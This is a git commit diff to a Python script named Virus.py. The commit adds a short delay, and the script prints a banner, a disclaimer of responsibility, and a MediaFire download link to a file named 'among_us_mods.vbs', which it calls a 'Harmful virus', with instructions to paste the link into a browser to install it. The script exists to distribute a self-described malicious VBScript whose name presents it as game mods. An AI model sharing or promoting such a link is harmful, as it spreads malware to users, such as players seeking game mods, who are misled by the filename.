cbd7401dae28e7a2942fd0096103a41687d9b995
Venxm <68974601+venomhaxor@users.noreply.github.com>
2021-02-02 07:06:53 -0600

    Update Virus.py

--- Virus.py
+++ Virus.py
@@ -1,3 +1,5 @@
+import time
+
 print("\033[1;34;40m.     .\033[1;34;40m \n")
 print("\033[1;32;40m .   .\033[1;32;40m \n")
 print("\033[1;34;40m  . .\033[1;34;40m \n")
@@ -5,5 +7,6 @@ print("\033[1;32;40m   .\033[1;32;40m \n")
 print(" ")
 print("\033[1;33;40mI WILL NOT BE HELD RESPONIBLE FOR YOUR ACTIONS WITH THESE VIRUS\033[1;33;40m \n")
 print(" ")
+time.sleep(2.4)
 print("\033[1;38;40mCopy the link below and paste it in browser to install\033[1;38;40m \n")
 print("Harmful virus: https://www.mediafire.com/file/k42j8gpe8homytq/among_us_mods.vbs/file")
